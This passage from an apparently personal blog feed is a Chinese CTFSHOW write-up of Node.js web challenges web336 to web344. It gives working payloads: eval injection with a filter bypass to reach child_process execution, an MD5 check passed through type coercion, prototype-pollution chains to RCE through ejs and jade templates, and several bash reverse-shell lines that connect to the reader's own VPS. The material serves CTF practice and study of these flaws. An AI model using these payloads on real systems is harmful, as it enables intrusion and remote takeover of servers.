plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__filename</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811231547821.png"></p><p>可以看到网站显示了当前文件的绝对路径<code>/app/routes/index.js</code></p><p>我们用fs模块的<code>readFileSync()</code>来读取文件，fs模块（File System 模块）是专门用于进行<strong>文件系统相关操作的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;).toString()</span><br></pre></td></tr></table></figure><p>直接爆出源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> evalstring = req.<span class="property">query</span>.<span class="property">eval</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">typeof</span>(evalstring) == <span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.<span class="title function_">search</span>(<span class="regexp">/exec|load/i</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(evalstring) &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>可以看到过滤了包含 <code>exec</code> 或 <code>load</code> 的字符串，有很多种方法可以做这题</p><p><strong>1. 字符串拼接绕过</strong></p><p>把<code>execSync</code>拆成 <code>exe</code> + <code>cSync</code>，然后拼接字符串，%2B是加号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234111861.png"></p><p>然后读取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;cat fl001g.txt&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234159579.png"></p><p><strong>2. spawnSync() 命令执行</strong></p><p>跟web335一样，换成<code>spawnSync()</code>即可绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl001g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234326867.png"></p><p><strong>3. readFileSync() 文件读取</strong></p><p>先用<code>readdirSync()</code>读取目录文件，然后用<code>readFileSync()</code>读取文件内容即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811234703548.png"></p><h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><p>题目给出了源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>其中重点需要关注的是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br></pre></td></tr></table></figure><p>要求传入的<code>a</code>和<code>b</code>长度相同，内容不相同且要求 <code>a</code> 加上 <code>flag</code> 后的 MD5 哈希值，必须等于 <code>b</code> 加上 <code>flag</code> 后的 MD5 哈希值</p><p>这里我们用<strong>数组绕过</strong></p><p>这里涉及到一个概念，如果传入<code>a[]=1&amp;b[]=2</code>，返回的是数组<code>[&#39;1&#39;]</code>和<code>[&#39;2&#39;]</code>，在md5校验那里就相当于需要<code>[&#39;1&#39;]+flag===[&#39;2&#39;]+flag</code>，而由于JavaScript **隐式类型转换 + 字符串拼接 **的原因，<code>[&#39;1&#39;]+flag</code>会变成<code>1flag</code>，举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span> + [<span class="number">2</span>,<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 步骤： [2,2] -&gt; 调用 toString() =&gt; &quot;2,2&quot;</span></span><br><span class="line"><span class="comment">// 字符串拼接 =&gt; &quot;1&quot; + &quot;2,2&quot; =&gt; &quot;12,2&quot;</span></span><br></pre></td></tr></table></figure><p>因此只要我们输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b=1</span><br></pre></td></tr></table></figure><p>a解析为数组<code>[&#39;1&#39;]</code>，b解析为字符串<code>&#39;1&#39;</code>，经过转换之后，得到的结果都是<code>1flag</code>，因此它们的md5相同，成功通过验证</p><p>也是顺利拿到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812172007286.png"></p><p>还有一种方法，就是往数组里面传入<strong>非数字索引</strong>，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure><p>返回的结果是<code>&#123; x: &#39;1&#39;&#125;</code>和<code>&#123; x: &#39;2&#39;&#125;</code>，变成JS里面的对象了，传入对象之后，经过<code>console.log</code>后返回的都是<code>[object Object]</code>，此时进行变量拼接得到的结果为<code>[object Object]flag</code>，再进行md5加密之后也是相同的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812174110379.png"></p><p>如果传入<code>a[x]=1&amp;b[x]=1</code>也是可以的，因为两个对象的比较并不是比较属性，而是通过引用内存里的位置来比较的，所以 <code>a !== b</code> 的条件依然成立</p><h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><p>下载源码分析，先看<code>app.js</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250812185834888.png"></p><p>可以看到包含了<code>index.js</code>和<code>login.js</code>，<code>index.js</code>里面没什么东西，主要看<code>login.js</code>文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812194405714.png"></p><p>想要拿到flag就必须要<strong>secert</strong>的<code>ctfshow</code>属性值为<code>36dboy</code>，且secert变量值为空。向下分析，可以看到body的内容被copy到了user里面，查看copy的定义，可以发现copy竟然跟merge方法一模一样，因此这题可以用<strong>原型链污染</strong>来做，传入属性<code>__proto__</code>来污染Object原型</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813180749964.png"></p><p>做原型链污染之前，建议先看一遍文章了解一下：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">深入理解 JavaScript Prototype 污染攻击</a></p><p>打开题目环境，随便输入账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812192813708.png"></p><p>可以看到body的值传到了user里面，我们修改键值对为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样做可以污染Object的原型，从而使得所有对象都继承了该属性，于是进行验证的时候，满足<code>secert.ctfshow===&#39;36dboy&#39;</code>，也就拿到了flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812192921525.png"></p><p>原型链被污染后，部分代码里其他依赖对象原型正常结构的地方会出错，依赖于纯净、标准原型链的对象操作（比如 for…in、Object.keys()、属性枚举和判断、库函数内部操作等）可能会出错或出现行为异常，导致POST访问<code>/login</code>时报 500 错误</p><p>因此这题只有一次污染机会，如果写错了值的话就只能重新启动环境做了，因为POST访问<code>/login</code>只返回500了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250812193909573.png"></p><h3 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h3><p>打开源码分析，在<code>app.js</code>可以看到指向三个路由</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813110919891.png"></p><p>相比上一题，这题<code>login.js</code>的校验条件变了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813111110126.png"></p><p>要求<code>secert.ctfshow===flag</code>，但我们并不知道flag的值，因此只能另辟蹊径</p><p>继续分析<code>api.js</code>，发现可以通过<strong>污染query</strong>来控制Function执行RCE操作</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813111300263.png"></p><p>由于 Node.js 默认不会自动暴露 <code>require</code> 给 <code>Function</code> 创建的函数，因此这里用<code>process.mainModule.constructor._load</code> 替代 <code>require</code>来包含<code>child_process</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里我们用exec执行反弹shell，因为exec是异步的，适用于长时间&#x2F;交互式&#x2F;不需要立即结果的任务（例如反弹 shell、启动后台进程、并发执行多任务）。这题的目标不是“读取输出”，而是“建立外部控制会话”，因此异步 exec 足以完成“执行命令”的动作，而且更贴合反连的使用场景：父进程不被阻塞，持续提供服务</p><p>先在VPS处开启<code>nc</code>监听，然后跟上题一样，在<code>/login</code>处传入payload</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813114617857.png"></p><p>接着POST访问<code>/api</code>即可建立连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813114957019.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813114917719.png"></p><p>执行命令<code>env</code>，在环境变量里成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813115850012.png"></p><h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><p>下载源码进行分析，也是先看<code>app.js</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813201348782.png"></p><p>可以看到，还是这几个文件，不过不同的是，<code>login.js</code>里面的user变量变了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813201624962.png"></p><p>要求<code>isAdmin</code>为true才可以通过，但是<code>isAdmin</code>已经被赋值为false了，因此在这里没办法污染</p><p>继续分析，可以看到<code>api.js</code>跟上题一样，因此可以用上题的方法来污染query反弹shell</p><p>但是如果直接传入<code>__proto__</code>，再访问<code>/api</code>会发现行不通</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813202719540.png"></p><p>需要污染两层才可以，因为<code>user.__proto__</code>不是<code>Object.prototype</code>，<code>user.__proto.__proto__</code>才是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250813203743959.png"></p><p>也是在环境变量处找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813203902301.png"></p><p>下面详细解释一下为什么<code>user.__proto__</code>不是指向<code>Object.prototype</code>，开启本地调试，先在web340项目文件夹处打开终端，运行 <code>npm install</code>安装依赖</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204211882.png"></p><p>然后在项目文件夹处打开package.json，可以看到<strong>负责启动服务器</strong>的是<code>bin/www</code>，因为在很多标准的Express项目中，项目结构是分离的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204457722.png"></p><p>修改配置文件的工作目录为web340，文件为<code>bin/www</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204802599.png"></p><p>在<code>www</code>文件中，可以看到运行的端口是在3000</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813204914963.png"></p><p>在<code>login.js</code>的第19行开启断点调试，然后在浏览器中打开 <a href="http://127.0.0.1:3000/">http://127.0.0.1:3000</a> ，在登录框随便输入点东西，触发<code>if(user.userinfo.isAdmin)&#123;</code>判断</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813205642028.png"></p><p>可以看到userinfo的<code>__proto__</code>后<code>__proto__</code>才是Object的<code>prototype</code>，为了更直观，我们在控制台输出看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813210054705.png"></p><p>对于user这个变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">//这是外层匿名构造函数</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">//这是内层匿名构造函数</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>user.userinfo</code> 对象是由内层构造函数创建的，所以 <code>user.userinfo.__proto__</code> 指向内层构造函数的<code>prototype</code></p><p>而内层构造函数的<code>__proto__</code>指向的才是Object的<code>prototype</code></p><p>所以这就是为什么要传入两次的原因</p><p><strong>拓展概念</strong></p><p>只有函数才拥有 <code>prototype</code> 属性，而由构造函数创建出来的普通对象实例没有这个属性</p><p>例如<code>user.userinfo</code>是一个<strong>对象实例</strong>，但它没有属于自己的 <code>prototype</code> 属性，控制台输出为<code>undefined</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813211513738.png"></p><table><thead><tr><th>属性</th><th>谁拥有</th><th>作用</th></tr></thead><tbody><tr><td><code>prototype</code></td><td>构造函数</td><td>定义实例继承的“蓝图”</td></tr><tr><td><code>__proto__</code></td><td>任意对象实例（包括函数对象）</td><td>一个指向其构造器的 <code>prototype</code> 的引用指针</td></tr></tbody></table><h3 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h3><p>下载附件分析代码，发现这题没有<code>api.js</code>了，而且<code>login.js</code>也没有地方污染</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813223720736.png"></p><p>继续分析代码，在<code>app.js</code>可以看到包含了ejs，且引擎设置为ejs</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813224859620.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813232421761.png"></p><p>网上搜了一下，发现<strong>ejs模板引擎</strong>有个漏洞可以利用，实现<strong>从原型链污染到RCE</strong></p><p>参考文章：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>跟上题一样，也是在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813225514864.png"></p><p>在<code>env</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813225743400.png"></p><h3 id="web342"><a href="#web342" class="headerlink" title="web342"></a>web342</h3><p>下载代码分析，总体跟上题代码差不多，但是<code>app.js</code>这两个地方不同</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813232321669.png"></p><p>模板引擎换成了<strong>jade</strong>，上网参考了部分文章，链接：<a href="https://xz.aliyun.com/news/6621">再探 JavaScript 原型链污染到 RCE</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>跟上题一样，在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813234149899.png"></p><p>在<code>env</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813234333039.png"></p><h3 id="web343"><a href="#web343" class="headerlink" title="web343"></a>web343</h3><p>这题在web342的基础上增加了过滤，但是影响不大，可以继续用上题的方法</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250813235152689.png"></p><p>在环境变量中读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813235308095.png"></p><p>后面看了一下<code>login.js</code>到底过滤了什么</p><p><img src="https://oss.waynejoons.icu/picphoto/20250813235855849.png"></p><p>只过滤了<code>text</code>，没什么用</p><h3 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h3><p>这题给出了部分代码，先分析一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>过滤了<strong>8c、2c和逗号</strong>，然后要求<strong>GET</strong>传入参数<strong>query</strong>，且满足 <code>query.name===&#39;admin&#39;&amp;&amp;query.password===&#39;ctfshow&#39;&amp;&amp;query.isVIP===true</code> 才可以拿到flag</p><p>也就是正常情况下我们应该传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>而经过URL编码之后变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=%7B%22name%22%3A%22admin%22%2C%22password%22%3A%22ctfshow%22%2C%22isVIP%22%3Atrue%7D</span><br></pre></td></tr></table></figure><p>双引号编码之后是<code>%22</code>，和c连接起来就是<code>%22c</code>，会被ban</p><p>这题用到了<strong>NodeJS的特性</strong>，当 URL 里传入了多个同名参数，如多次出现 <code>query=</code>，Express 解析会将这些参数放入数组中，然后<code>JSON.parse</code> 会将数组的字符串元素拼接成一个完整字符串再解析。同时<code>c</code>也要进行URL编码，变成<code>%63</code>，这样就不会被ban了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250814002612463.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>bfengj：<a href="https://blog.csdn.net/rfrder/article/details/115218397">CTFshow-WEB入门-node.js</a></p><p>yu22x：<a href="https://blog.csdn.net/miuzzx/article/details/111780832">CTFSHOW nodejs篇</a></p>]]></content>
    
    
    <summary type="html">CTFSHOW nodejs专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
  </entry>
  
</feed>
